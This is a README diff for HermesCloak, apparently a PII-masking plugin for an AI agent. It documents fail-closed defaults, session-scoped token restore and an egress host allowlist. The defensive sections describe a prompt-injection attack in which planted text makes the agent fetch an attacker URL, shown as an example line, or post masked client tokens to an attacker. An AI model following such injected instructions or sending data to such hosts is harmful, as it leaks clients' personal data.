@@ -6,10 +6,11 @@ client identity, while the agent and its tools keep working with real data.
 
 HermesCloak loads as a **hermes-agent plugin** (current hermes-agent has a plugin system with
 request middleware). Nothing in the hermes-agent checkout is modified, so **hermes updates no
-longer remove it**. Every interception point is **fail-open** (it can never raise into the agent;
-`fail_mode: closed` in the profile withholds text instead of sending it unfiltered) and
-**MODE-scoped**: an agent whose `$HERMES_HOME/cloak/` dir is absent or whose `MODE` is `off`
-is completely unaffected.
+longer remove it**. Every interception point is **fail-closed** in `enforce` (it can never raise
+into the agent; an internal error withholds the text instead of sending it, unless the profile says
+`fail_mode: open`) and **MODE-scoped**: an agent whose `$HERMES_HOME/cloak/` dir is absent or whose
+`MODE` file is absent or says `off` is completely unaffected. A `MODE` file that exists but cannot be
+read or understood (a typo, an odd encoding) counts as `enforce`.
 
 > Upgrading from the old source-patch install? See **[UPGRADING.md](UPGRADING.md)** — the old
 > `gateway/run.py` / `conversation_loop.py` anchors no longer exist in hermes-agent, so the
@@ -48,12 +49,13 @@ $HERMES_HOME/cloak/
   profile.yaml    # copy of profiles/example.yaml, adapted   (never_mask, never_mask_domains, fail_mode, jev_check…)
   gazetteer.txt   # optional: known names, one "surface<TAB>type" per line (e.g. client list)
   ner_url         # optional: URL of the Hebrew NER microservice (see hermescloak/service/ner_service.py)
+  egress_hosts    # optional: hosts the HTTP egress net may restore tokens for (one per line, see below)
   vault_key_file  # optional: PATH of a Fernet key file → vault encrypted at rest (see below)
   vault_mode      # optional: "memory" = never persist the token map (rollback switch)
   # written by HermesCloak:
-  vaults/         # the per-agent token map: <id>.json snapshot + .journal + .bak  (0600, TTL from last use)
-  replay.json     # replay cache: hash(restored text) → the model's own tokenized text
-  audit.log       # JSONL events, counts/types only — never real values (rotates at 5 MB × 3)
+  vaults/         # the per-agent token map: <id>.json snapshot + .journal + .bak  (0700/0600, TTL from last use)
+  replay.json     # replay cache: hash(restored text) → the model's own tokenized text (HMAC when encrypted)
+  audit.log       # JSONL events, counts/types only — never real values (0600, rotates at 5 MB × 3)
 ```
 
 Edits to `profile.yaml`, `gazetteer.txt` and `ner_url` apply **live** to running sessions. A broken
@@ -102,9 +104,11 @@ silently reducing coverage.
 | vault idle / swept / deleted while in use | the TTL counts from last **use** (restores and reuse refresh it); sweeps re-check under the vault lock; a live process that finds its file gone rewrites it (`vault_resurrected`) |
 | broken `profile.yaml` / unreadable `gazetteer.txt` | last good version kept (`config_error`) |
 | NER service hung or down | circuit breaker: one timeout, then NER is skipped for 30 s (`ner_down` / `ner_up`) instead of a timeout per message |
-| internal filter error | `fail_mode: open` → original sent + `unfiltered_sent`; `fail_mode: closed` → text withheld + `blocked_send` (also with `jev_action: block` on a Jev hit) |
+| internal filter error (incl. hostile input: broken Unicode, absurd nesting) | `fail_mode: closed` (default) → text withheld + `blocked_send`; `fail_mode: open` → original sent + `unfiltered_sent` (also `blocked_send` with `jev_action: block` on a Jev hit) |
+| self-test fails, or the auxiliary funnel can't be wrapped | in `enforce` every request is withheld (`blocked_send`, reason `plugin_degraded`) until hermes and the plugin match again; `fail_mode: open` keeps sending with reduced coverage |
 | hermes update moves an interception point | `seam_missing` at load + warning; two official-API backstops still restore tool arguments (`tool_request` middleware) and the final reply (`transform_llm_output`) |
 | concurrent sessions in one process | the vault is thread-safe (one token per value, ever) |
+| a token from another session (guessed, or planted in a web page / tool result) | not restored: a reply or tool call gets back only the tokens **its own session's** tokenizer substituted (`foreign_token`) — see below |
 | long-running gateway | engines, content caches and the replay cache are bounded LRUs; audit log rotates |
 
 ### Encryption at rest
@@ -118,6 +122,26 @@ pip install 'hermescloak[crypto]'                                      # the cry
 
 Keep the key **outside** the cloak dir (it protects a copied/backed-up disk, not a compromised
 running process). Egress scripts read the same key setting.
+
+### Restore scope: a session gets back only its own values
+
+One vault serves all of an agent's sessions (a token stays restorable across sessions and restarts),
+and tokens are predictable (`⟦לקוח_1⟧`, `⟦תז_1⟧`…). So restore is scoped: a reply, a streamed delta
+or a tool call gets back only the tokens that **its own session's** requests had substituted for
+real values. A token that reached the model any other way — guessed, or typed into a web page, a
+document or a tool result by someone trying to make the agent `fetch https://attacker/?q=⟦תז_1⟧` —
+stays a token (`foreign_token` in the audit log). The whole history is resent on every turn, so a
+session's scope rebuilds itself after a restart. When neither a session id nor the current turn is
+known, nothing is restored (`restore_unscoped`).
+
+### HTTP egress net (`requests`)
+
+`install/egress_autoload.py` can make every `requests` call restore tokens in the outgoing body (for
+mail/CRM scripts the agent writes). It restores **only for hosts listed** in
+`$HERMES_HOME/cloak/egress_hosts`, one per line (`graph.microsoft.com`, or `example.com` for it and
+its subdomains). For any other host the tokens go out as tokens (`egress_blocked`): otherwise a
+prompt-injected script could post `⟦לקוח_1⟧` to an attacker and receive the real value. Without
+the file nothing is restored.
 
 ## 5. Verify it's live and healthy
 
@@ -143,11 +167,14 @@ fail-safe alarm — investigate).
 | `jev_unavailable` | the second opinion did not run: `no-key`, `timeout`, `breaker`, `busy`, `daily-cap`, `error` (+ `backend`) — the turn went on unchecked (rate-limited; the daily cap is announced once a day) |
 | `decide_shadow` | (`decide_shadow: true`) one decision as both backends saw it: `primary`, `shadow`, their answers as probabilities only, `shadow_ms` |
 | `enforce_restore` | a reply was restored; `leftover` > 0 = alarm |
-| `leftover_token` | which token(s) could not be restored |
+| `leftover_token` | how many tokens could not be restored, and of which types (never the text) |
+| `foreign_token` | a reply or tool call carried a token its session was never shown — a guess or an injection attempt: **investigate** |
+| `restore_unscoped` | a restore ran with no session and no turn context, so nothing was restored |
+| `egress_blocked` | the HTTP egress net saw tokens in a request to a host not in `egress_hosts` and left them as tokens |
 | `leaked_original` | the model wrote a value we had masked — it saw it via some unmasked path: **investigate** |
 | `new_pii` | PII-shaped values the model introduced itself (counts per type) |
 | `backstop_restore` | a backstop caught a token the primary restore missed (should be rare) |
-| `unfiltered_sent` / `blocked_send` | an internal error; sent unfiltered (fail-open) / withheld (fail-closed) |
+| `unfiltered_sent` / `blocked_send` | an internal error (only the exception's type is logged); sent unfiltered (`fail_mode: open`) / withheld (default) |
 | `seam_missing`, `config_error`, `ner_down`, `vault_*` | see the reliability table above |
 
 `python install/apply_hooks.py --verify --strict` summarizes all of this (vault health, last plugin
